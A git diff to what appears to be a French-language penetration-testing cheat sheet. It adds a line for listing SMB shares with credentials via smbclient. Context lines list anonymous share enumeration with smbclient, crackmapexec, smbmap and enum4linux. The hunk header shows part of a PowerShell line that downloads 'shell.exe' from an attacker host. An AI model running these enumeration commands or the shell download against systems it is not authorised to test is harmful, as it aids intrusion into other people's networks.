@@ -15,6 +15,7 @@ Ou alors: (new-object System.Net.WebClient).DownloadFile('http://[IP]/shell.exe'
 ## Partage Samba:
 **Lister tout les partages en anonymous:** smbclient -N -L \\\\[IP]\\  
 **Ou:** crackmapexec smb <IP> -u '[user]' -p '[pass]' --shares #Null user  
+**avec un compte:** smbclient -L //[IP]/ -U [user] --password=[pass]  
 **Lister tout les partages et les droits associés:** smbmap -H [ip]  
 **Aller dans un partage:** smbclient -N \\\\[IP]\\[nom_du_partage]  
 **Énumération  des services windows:** enum4liux [IP CIBLE]  
